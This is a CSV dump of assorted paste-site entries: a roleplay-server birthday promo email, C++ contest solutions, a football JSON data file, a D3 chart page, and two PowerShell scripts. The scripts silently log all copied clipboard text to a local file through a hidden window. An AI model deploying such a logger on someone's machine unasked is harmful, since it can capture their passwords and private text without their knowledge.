id,title,username,language,date,content
GWgH64FA,Dieser Geburtstag auf GrandRP ist etwas ganz Besonderes!,Shpindlier,HTML,Thursday 29th of February 2024 12:04:51 PM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCjPEEC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Wir freuen uns euch zu verkünden, dass GrandRP offiziell 3 Jahre alt geworden ist! Um diesen Meilenstein zu feiern, haben wir ein brandneues Update auf allen Servern veröffentlicht. Dieses Update beinhaltet neue HUDs, Interfaces und ein spezielles In-Game-Event, mit dem ihr viel Spaß haben werdet!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
q7Y5jKNM,KRSU.7611,bofk,C++,Thursday 29th of February 2024 12:01:46 PM CDT,"#include <bits/stdc++.h>
 
using namespace std;

#define operation pair<int,pair<int,int>>
#define t first
#define x second.first
#define y second.second

int main() {
  ios::sync_with_stdio(0);
  cin.tie(0);
  int n;
  cin >> n;
  vector<long long> a(n);
  for (int i = 0; i < n; i++) {
    cin >> a[i];
  }
  int m;
  cin >> m;
  vector<operation> q(m);
  
  for (int i = 0; i < m; i++) {
    cin >> q[i].t;
    if (q[i].t == 1) {
      cin >> q[i].x;
    } else if (q[i].t == 2) {

    } else {
      cin >> q[i].x >> q[i].y;
    }
  }
  
  deque<long long> p(a.begin(), a.begin()+a.size()/2);
  deque<long long> s(a.begin()+a.size()/2, a.end());
  
  for (int i = 1; i < p.size(); i++) p[i] += p[i - 1];
  for (int i = s.size() - 2; i >= 0; i--) s[i] += s[i + 1];
  
  for (auto v : q) {
    if (v.t == 1) {
      if ((p.size() + s.size()) % 2 == 1) {
        p.push_back((p.size() > 0 ? p.back() : 0) + v.x);
      } else {
        s.push_front((s.size() > 0 ? s.front() : 0) + v.x);
      }
    } else if (v.t == 2) {
      if ((p.size() + s.size()) % 2 == 1) {
        s.pop_front();
      } else {
        p.pop_back();
      }
    } else {
      v.x--; v.y--;
      if (v.y < p.size()) {
        cout << p[v.y] - (v.x - 1 >= 0 ? p[v.x - 1] : 0) << ""\n"";
      } else if (v.x >= p.size()) {
        v.x -= p.size(); v.y -= p.size();
        cout << s[v.x] - (v.y + 1 < s.size() ? s[v.y + 1] : 0) << ""\n"";
      } else {
        long long sum = p.back() - (v.x - 1 >= 0 ? p[v.x - 1] : 0);
        v.y -= p.size();
        sum += s.front() - (v.y + 1 < s.size() ? s[v.y + 1] : 0);
        cout << sum << ""\n"";
      }
    }
  }
  
  return 0;
}"
PitcFuGK,Matchs (Soccer Point),AhmadXploit,Dart,Thursday 29th of February 2024 11:58:55 AM CDT,"{
  ""leagues"": [
    {
      ""image"": ""assets/images/laliga.png"",
      ""league"": ""La Liga"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/images-removebg-preview (2).png"",
      ""team1"": ""Real Madrid"",
      ""image2"": ""assets/images/barcelona.png"",
      ""team2"": ""Barcelona"",
      ""score"": ""4 : 1"",
      ""color"": ""#f72b91""
    },
    {
      ""image"": ""assets/images/images-removebg-preview (1).png"",
      ""league"": ""Premier League"",
      ""week"": ""Week 11"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man United"",
      ""score"": ""4 : 1"",
      ""color"": ""#3f51b5""
    },
    {
      ""image"": ""assets/images/seriea.png"",
      ""league"": ""Serie A"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man United"",
      ""score"": ""4 : 1"",
      ""color"": ""#4caf50""
    },
    {
      ""image"": ""assets/images/seriea.png"",
      ""league"": ""La Liga"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man City"",
      ""score"": ""4 : 1"",
      ""color"": ""#ff9800""
    }
  ],
  ""matches"": [
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    }
  ]
}"
Q0Li0g7L,This Birthday on Grand RP became special,Shpindlier,HTML,Thursday 29th of February 2024 11:47:35 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCjPEEC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">We are thrilled to announce that Grand RP has officially turned 3 years old! To celebrate this milestone, we have released a brand new update on all servers. This update includes new HUDs, interfaces, and a special in-game event for you to enjoy.</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
s5vrF9yK,title_scatter_v2,NTahmid,HTML,Thursday 29th of February 2024 11:46:48 AM CDT,"```<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
    <script src=""https://rawgit.com/susielu/d3-annotation/master/d3-annotation.min.js""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation-group text {
      fill: #C86984;
    }

    .annotation-group line {
      stroke: #C86984;
    }

    .annotation-group path {
      stroke: #C86984;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        
        //X-axis label
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");


        //Y-axis label
        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        //Title of the chart
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        //Chart Legends
        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotation for the title
        const annotations = [
          {
            note: {
              label: ""Doping in professional bike racing"",
              bgPadding: 20,
              title: ""Chart Title""
            },
            color: [""#C86984""],
            x: margin.left + (width - margin.left - margin.right) / 2,
            y: margin.top / 2.6,
            dy: -30,
            dx: 0,
            type: d3.annotationCalloutCircle,
            subject: {
              radius: 100,         // radius of circle
              radiusPadding: 5   // padding to add around circle
            },
          }
        ];

        // Add annotation to the chart
        const makeAnnotations = d3.annotation()
          .annotations(annotations)
          .type(d3.annotationLabel)
          .accessors({
            x: d => xScale(d.x),
            y: d => yScale(parseTime(d.y))
          })
          .accessorsInverse({
             x: d => xScale.invert(d.x),
             y: d => yScale.invert(d.y)
          })
          .on('subjectover', function(annotation) {
            annotation.type.a.selectAll(""g.annotation-connector, g.annotation-note"")
              .classed(""hidden"", false)
          })
          .on('subjectout', function(annotation) {
            annotation.type.a.selectAll(""g.annotation-connector, g.annotation-note"")
              .classed(""hidden"", true)
          });

        svg.append(""g"")
          .attr(""class"", ""annotation-group"")
          .call(makeAnnotations);
      });
    </script>
  </body>
</html>
```"
Q5XBaVyY,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 11:40:25 AM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <queue>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const int maxn = 1e5 + 10;
int n, d;
ll p;
ll a[maxn];
bool check(int k) {
    ll sum = 0;
    priority_queue<ll> pq, greatest;
    for(int i = 0; i < n; i++) {
        pq.push(a[i]);
    }
    for(int i = 1; i <= d; i++) {
        ll max_tree = 0;
        if(!pq.empty()) {
            max_tree = pq.top();
            pq.pop();
        }
        sum += max_tree;
        if(i > k and !greatest.empty()) {
            pq.push(greatest.top());
            greatest.pop();
        }
        greatest.push(max_tree);
    }
    return sum >= p;
}
int main() {
    ios_base::sync_with_stdio(false);
    cin >> n >> p >> d;
    
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    int L = 1, R = d;
    int res = -1;
    while(L <= R) {
        int mid = (L + R) / 2;
        if(check(mid)) {
            L = mid + 1;
            res = mid;
        }
        else {
            R = mid - 1;
        }
    }
    if(res == d) {
        cout << ""seedno"" << endl;
    }
    else {
        cout << res << endl;
    }
    return 0;
}

"
5r4i1vAr,Review Trade Direct 365,fxvnpro,PHP,Thursday 29th of February 2024 11:39:06 AM CDT,https://www.fxvnpro.com/review-trade-direct-365/
820tzmTf,Untitled,502781,PowerShell,Thursday 29th of February 2024 11:38:17 AM CDT,"#adapted from https://github.com/samjones3/powershell-utilities/blob/main/PowerShell-Clipboard-Watcher.ps1
[CmdletBinding()]
param
(
)
 
$script:ErrorActionPreference = ""Stop""
Set-StrictMode -Version Latest
function PSScriptRoot { $MyInvocation.ScriptName | Split-Path }
Trap { throw $_ }
 
function Register-ClipboardWatcher
{
    if (-not (Test-Path Variable:Global:ClipboardWatcher))
    {
        Register-ClipboardWatcherType
        $Global:ClipboardWatcher = New-Object ClipboardWatcher
 
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -SupportEvent -Action `
        {
            Unregister-ClipboardWatcher
        }
    }
 
    return $Global:ClipboardWatcher
}
 
function Unregister-ClipboardWatcher
{
    if (Test-Path Variable:Global:ClipboardWatcher)
    {
        $Global:ClipboardWatcher.Dispose();
        Remove-Variable ClipboardWatcher -Scope Global
        Unregister-Event -SourceIdentifier ClipboardWatcher
    }
}
 
function Register-ClipboardWatcherType
{
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp -TypeDefinition `
    @""
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
 
public class ClipboardWatcher : IDisposable
{
    readonly Thread _formThread;
    bool _disposed;
 
    public ClipboardWatcher()
    {
        _formThread = new Thread(() => { new ClipboardWatcherForm(this); })
                      {
                          IsBackground = true
                      };
 
        _formThread.SetApartmentState(ApartmentState.STA);
        _formThread.Start();
    }
 
    public void Dispose()
    {
        if (_disposed)
            return;
        Disposed();
        if (_formThread != null && _formThread.IsAlive)
            _formThread.Abort();
        _disposed = true;
        GC.SuppressFinalize(this);
    }
 
    ~ClipboardWatcher()
    {
        Dispose();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
    public event Action Disposed = delegate { };
 
    public void OnClipboardTextChanged(string text)
    {
        ClipboardTextChanged(text);
    }
}
 
public class ClipboardWatcherForm : Form
{
    public ClipboardWatcherForm(ClipboardWatcher clipboardWatcher)
    {
        HideForm();
        RegisterWin32();
        ClipboardTextChanged += clipboardWatcher.OnClipboardTextChanged;
        clipboardWatcher.Disposed += () => InvokeIfRequired(Dispose);
        Disposed += (sender, args) => UnregisterWin32();
        Application.Run(this);
    }
 
    void InvokeIfRequired(Action action)
    {
        if (InvokeRequired)
            Invoke(action);
        else
            action();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
 
    void HideForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Load += (sender, args) => { Size = new Size(0, 0); };
    }
 
    void RegisterWin32()
    {
        User32.AddClipboardFormatListener(Handle);
    }
 
    void UnregisterWin32()
    {
        if (IsHandleCreated)
            User32.RemoveClipboardFormatListener(Handle);
    }
 
    protected override void WndProc(ref Message m)
    {
        switch ((WM) m.Msg)
        {
            case WM.WM_CLIPBOARDUPDATE:
                ClipboardChanged();
                break;
 
            default:
                base.WndProc(ref m);
                break;
        }
    }
 
    void ClipboardChanged()
    {
        if (Clipboard.ContainsText())
            ClipboardTextChanged(Clipboard.GetText());
    }
}
 
public enum WM
{
    WM_CLIPBOARDUPDATE = 0x031D
}
 
public class User32
{
    const string User32Dll = ""User32.dll"";
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hWndObserver);
}
""@
 
}
 
function Register-ClipboardTextChangedEvent
{
    param
    (
        [ScriptBlock] $Action
    )
    # before registering, unregister it, so there is no collision when you keep 
    # rerunning this thing during debugging and development.
    # the -EA flag tells it to run silently (as will throw an error if event is not already registered)
    Unregister-Event -SourceIdentifier ClipboardWatcher -EA 0
    $watcher = Register-ClipboardWatcher
    Register-ObjectEvent $watcher -EventName ClipboardTextChanged -Action $Action -SourceIdentifier ClipboardWatcher
}
 
Register-ClipboardTextChangedEvent -Action `
    {
        param
        (
            [string] $text
        )
 
        Add-Content -Path '.\text.txt' -Value ""$text`r`n"" -Encoding Unicode
    }"
s6S4xwcr,Untitled,502781,PowerShell,Thursday 29th of February 2024 11:33:16 AM CDT,"#adapted from https://github.com/samjones3/powershell-utilities/blob/main/PowerShell-Clipboard-Watcher.ps1
[CmdletBinding()]
param
(
)
 
$script:ErrorActionPreference = ""Stop""
Set-StrictMode -Version Latest
function PSScriptRoot { $MyInvocation.ScriptName | Split-Path }
Trap { throw $_ }
 
function Register-ClipboardWatcher
{
    if (-not (Test-Path Variable:Global:ClipboardWatcher))
    {
        Register-ClipboardWatcherType
        $Global:ClipboardWatcher = New-Object ClipboardWatcher
 
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -SupportEvent -Action `
        {
            Unregister-ClipboardWatcher
        }
    }
 
    return $Global:ClipboardWatcher
}
 
function Unregister-ClipboardWatcher
{
    if (Test-Path Variable:Global:ClipboardWatcher)
    {
        $Global:ClipboardWatcher.Dispose();
        Remove-Variable ClipboardWatcher -Scope Global
        Unregister-Event -SourceIdentifier ClipboardWatcher
    }
}
 
function Register-ClipboardWatcherType
{
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp -TypeDefinition `
    @""
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
 
public class ClipboardWatcher : IDisposable
{
    readonly Thread _formThread;
    bool _disposed;
 
    public ClipboardWatcher()
    {
        _formThread = new Thread(() => { new ClipboardWatcherForm(this); })
                      {
                          IsBackground = true
                      };
 
        _formThread.SetApartmentState(ApartmentState.STA);
        _formThread.Start();
    }
 
    public void Dispose()
    {
        if (_disposed)
            return;
        Disposed();
        if (_formThread != null && _formThread.IsAlive)
            _formThread.Abort();
        _disposed = true;
        GC.SuppressFinalize(this);
    }
 
    ~ClipboardWatcher()
    {
        Dispose();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
    public event Action Disposed = delegate { };
 
    public void OnClipboardTextChanged(string text)
    {
        ClipboardTextChanged(text);
    }
}
 
public class ClipboardWatcherForm : Form
{
    public ClipboardWatcherForm(ClipboardWatcher clipboardWatcher)
    {
        HideForm();
        RegisterWin32();
        ClipboardTextChanged += clipboardWatcher.OnClipboardTextChanged;
        clipboardWatcher.Disposed += () => InvokeIfRequired(Dispose);
        Disposed += (sender, args) => UnregisterWin32();
        Application.Run(this);
    }
 
    void InvokeIfRequired(Action action)
    {
        if (InvokeRequired)
            Invoke(action);
        else
            action();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
 
    void HideForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Load += (sender, args) => { Size = new Size(0, 0); };
    }
 
    void RegisterWin32()
    {
        User32.AddClipboardFormatListener(Handle);
    }
 
    void UnregisterWin32()
    {
        if (IsHandleCreated)
            User32.RemoveClipboardFormatListener(Handle);
    }
 
    protected override void WndProc(ref Message m)
    {
        switch ((WM) m.Msg)
        {
            case WM.WM_CLIPBOARDUPDATE:
                ClipboardChanged();
                break;
 
            default:
                base.WndProc(ref m);
                break;
        }
    }
 
    void ClipboardChanged()
    {
        if (Clipboard.ContainsText())
            ClipboardTextChanged(Clipboard.GetText());
    }
}
 
public enum WM
{
    WM_CLIPBOARDUPDATE = 0x031D
}
 
public class User32
{
    const string User32Dll = ""User32.dll"";
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hWndObserver);
}
""@
 
}
 
function Register-ClipboardTextChangedEvent
{
    param
    (
        [ScriptBlock] $Action
    )
    # before registering, unregister it, so there is no collision when you keep 
    # rerunning this thing during debugging and development.
    # the -EA flag tells it to run silently (as will throw an error if event is not already registered)
    Unregister-Event -SourceIdentifier ClipboardWatcher -EA 0
    $watcher = Register-ClipboardWatcher
    Register-ObjectEvent $watcher -EventName ClipboardTextChanged -Action $Action -SourceIdentifier ClipboardWatcher
}
 
Register-ClipboardTextChangedEvent -Action `
    {
        param
        (
            [string] $text
        )
 
        Add-Content -Path '.\text.txt' -Value $text -Encoding Unicode
    }"
jPdyfT1e,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 11:23:27 AM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <fstream>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const ll  maxn = 3e5 + 10;
const ll  logn = 18;
const ll  INF = 2e15;

int main() {
    ios_base::sync_with_stdio(false);
    int n, q;
    cin >> n >> q;
    
    vector<int> v(n);
    vector<int> idx(55, -1);
    for(int i = 0; i < n; i++) {
        cin >> v[i];
        if(idx[v[i]] == -1) {
            idx[v[i]] = i;
        }
    }
    
    for(int i = 0; i < q; i++) {
        int x;
        cin >> x;
        cout << idx[x] + 1 << "" "";
        for(int j = 1; j <= 50; j++){
            if(idx[j] != -1 and idx[j] < idx[x]) {
                idx[j]++;
            }
        }
        idx[x] = 0;
    }
    
    return 0;
}

"
